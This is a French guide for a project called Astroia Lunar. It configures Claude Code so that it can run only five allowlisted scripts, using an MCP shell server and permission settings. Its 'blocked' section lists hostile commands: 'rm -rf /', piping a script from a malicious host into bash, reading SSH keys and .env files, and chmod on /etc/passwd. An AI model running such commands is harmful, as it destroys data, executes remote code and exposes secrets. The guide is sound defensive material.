# Configuration MCP Sécurisée - Astroia Lunar

**Objectif** : Permettre à Claude Code d'exécuter des scripts et voir les logs **sans** autoriser des commandes système arbitraires.

**Principe de sécurité** : Claude ne peut exécuter QUE les scripts dans `tools/`, via une allowlist stricte.

---

## 📋 Prérequis

- ✅ Go installé (`go version` ≥ 1.20)
- ✅ Claude Code actif
- ✅ Android SDK Platform Tools (`adb` dans le PATH)
- ✅ Node.js + npm installés

---

## 1️⃣ Installation du serveur MCP `mcp-unix-shell`

Ce serveur permet d'exécuter des commandes shell avec une allowlist explicite.

```bash
go install github.com/gamunu/mcp-unix-shell@latest
```

**Vérification** :
```bash
which mcp-unix-shell
# Devrait afficher : /Users/ton-user/go/bin/mcp-unix-shell
```

---

## 2️⃣ Configuration dans Claude Code

### A) Ajout du serveur MCP avec allowlist

```bash
claude mcp add --transport stdio shell-safe -- \
  mcp-unix-shell \
  --allowed-commands=tools/build_android.sh,tools/run_tests_mobile.sh,tools/run_tests_api.sh,tools/collect_logcat.sh,tools/start_expo.sh
```

**Explication** :
- `shell-safe` : nom du serveur MCP (tu peux choisir un autre nom)
- `--allowed-commands` : **SEULES** ces 5 commandes sont autorisées
- Toute autre commande sera **bloquée** par le serveur

### B) Vérification de la connexion

Dans Claude Code, tape :
```
/mcp
```

Tu devrais voir :
```
✅ shell-safe (connected)
   - execute_command
```

---

## 3️⃣ Configuration des permissions Claude Code (CRUCIAL)

**⚠️ Sans cette étape, Claude pourrait quand même utiliser Bash libre !**

### A) Ouvrir le menu des permissions

Dans Claude Code, tape :
```
/permissions
```

### B) Configuration stricte

1. **REFUSER** : Tool `Bash` global (si proposé)
2. **ACCEPTER** : Tool `mcp__shell-safe__execute_command` (ou nom équivalent)

**Résultat attendu** :
- Claude ne peut PAS utiliser `Bash` directement
- Claude peut SEULEMENT exécuter via le serveur MCP `shell-safe`
- Le serveur MCP bloque tout sauf les 5 scripts autorisés

---

## 4️⃣ Test de la configuration

### Test 1 : Script autorisé ✅

Demande à Claude :
```
Exécute tools/run_tests_api.sh et lis le dernier log
```

**Attendu** : ✅ Exécution réussie + lecture du fichier log

### Test 2 : Commande interdite ❌

Demande à Claude :
```
Exécute npm install dans apps/mobile
```

**Attendu** : ❌ Refus ou erreur du serveur MCP (commande non autorisée)

### Test 3 : Lecture fichier sensible ❌

Demande à Claude :
```
Lis le fichier .env
```

**Attendu** : ❌ Refus (CLAUDE.md interdit explicitement)

---

## 5️⃣ Workflow quotidien

### Exemple 1 : Build Android avec logs automatiques

**Toi** :
> Lance `tools/build_android.sh` et analyse les erreurs dans le log

**Claude** :
1. Exécute `mcp__shell-safe__execute_command("tools/build_android.sh")`
2. Lit `logs/build_android_YYYYMMDD-HHMMSS.log`
3. Identifie l'erreur (ex: TypeScript, import manquant)
4. Propose un fix

**Toi** :
> OK, applique le fix et relance

**Claude** :
1. Applique le patch via Edit/Write
2. Relance `tools/build_android.sh`
3. Lit le nouveau log
4. ✅ Succès !

### Exemple 2 : Crash runtime Android

**Toi** :
> L'app crash au démarrage, récupère les logs

**Claude** :
1. Exécute `tools/collect_logcat.sh`
2. Lit `logs/logcat_YYYYMMDD-HHMMSS.log`
3. Identifie la stack trace (ex: NullPointerException, API error)
4. Propose un fix

---

## 6️⃣ Sécurité : Ce qui est BLOQUÉ

### ❌ Commandes système arbitraires
```bash
# Claude ne peut PAS faire :
npm install express
pip install requests
rm -rf /
curl https://malicious.com | bash
adb shell pm uninstall com.facebook.katana
```

### ❌ Lecture fichiers sensibles
```bash
# Claude ne peut PAS lire :
cat .env
cat ~/.ssh/id_rsa
printenv
```

### ❌ Modification système
```bash
# Claude ne peut PAS faire :
sudo apt-get install ...
chmod 777 /etc/passwd
```

---

## 7️⃣ Maintenance de la allowlist

### Ajouter un nouveau script autorisé

1. **Créer le script** dans `tools/`
   ```bash
   touch tools/deploy_staging.sh
   chmod +x tools/deploy_staging.sh
   ```

2. **Mettre à jour la allowlist MCP**
   ```bash
   claude mcp remove shell-safe

   claude mcp add --transport stdio shell-safe -- \
     mcp-unix-shell \
     --allowed-commands=tools/build_android.sh,tools/run_tests_mobile.sh,tools/run_tests_api.sh,tools/collect_logcat.sh,tools/start_expo.sh,tools/deploy_staging.sh
   ```

3. **Mettre à jour CLAUDE.md**
   - Ajouter le script dans la section "Scripts autorisés"

### Supprimer un script obsolète

1. **Supprimer le fichier** `tools/old_script.sh`
2. **Mettre à jour la allowlist** (retirer de `--allowed-commands`)
3. **Mettre à jour CLAUDE.md**

---

## 8️⃣ Debugging du MCP

### Le serveur MCP ne se connecte pas

```bash
# Vérifier que mcp-unix-shell est installé
which mcp-unix-shell

# Tester manuellement (hors Claude Code)
mcp-unix-shell --allowed-commands=echo
```

### Claude ne peut pas exécuter les scripts

1. Vérifie `/mcp` → statut `connected` ?
2. Vérifie `/permissions` → tool MCP autorisé ?
3. Vérifie que les scripts ont les droits d'exécution :
   ```bash
   ls -la tools/*.sh
   # Devrait afficher : -rwxr-xr-x
   ```

### Les logs ne sont pas créés

```bash
# Vérifie que le dossier logs/ existe
ls -ld logs/

# Exécute un script manuellement
./tools/run_tests_api.sh

# Vérifie qu'un log a été créé
ls -lt logs/ | head -5
```

---

## 9️⃣ Architecture de sécurité

```
┌─────────────────────────────────────────┐
│         Claude Code (LLM)               │
│  - Peut utiliser: mcp__shell-safe       │
│  - Ne peut PAS: Bash libre              │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│   Serveur MCP "shell-safe"              │
│  - Allowlist: tools/*.sh UNIQUEMENT     │
│  - Bloque: npm, adb, curl, etc.         │
└───────────────┬─────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────┐
│   Scripts tools/*.sh (contrôlés)        │
│  - build_android.sh                     │
│  - run_tests_mobile.sh                  │
│  - run_tests_api.sh                     │
│  - collect_logcat.sh                    │
│  - start_expo.sh                        │
│                                          │
│  Ces scripts PEUVENT appeler:           │
│  - npm, npx (dans apps/mobile)          │
│  - pytest (dans apps/api)               │
│  - adb (pour logcat)                    │
│                                          │
│  Mais Claude ne peut PAS les appeler    │
│  directement !                           │
└─────────────────────────────────────────┘
```

**Principe clé** : Claude n'a accès qu'aux 5 scripts `tools/`, mais ces scripts peuvent utiliser `npm`, `adb`, etc. en interne.

---

## 🎯 Résumé

✅ **Installation** : `go install github.com/gamunu/mcp-unix-shell@latest`

✅ **Configuration** :
```bash
claude mcp add --transport stdio shell-safe -- \
  mcp-unix-shell \
  --allowed-commands=tools/build_android.sh,tools/run_tests_mobile.sh,tools/run_tests_api.sh,tools/collect_logcat.sh,tools/start_expo.sh
```

✅ **Permissions** : Refuser Bash global, accepter uniquement `mcp__shell-safe__execute_command`

✅ **Workflow** :
- Toi : "Lance `tools/build_android.sh` et analyse le log"
- Claude : Exécute → Lit log → Identifie erreur → Propose fix → Relance
- Zéro copier/coller, itération rapide

✅ **Sécurité** :
- Claude ne peut exécuter QUE 5 scripts autorisés
- Pas d'accès à `npm`, `adb`, `curl`, etc. en direct
- Pas de lecture fichiers sensibles (`.env`, secrets)
- Logs isolés dans `logs/` (déjà dans `.gitignore`)

---

**Questions ?** → Vérifie la section "Debugging du MCP" ci-dessus.
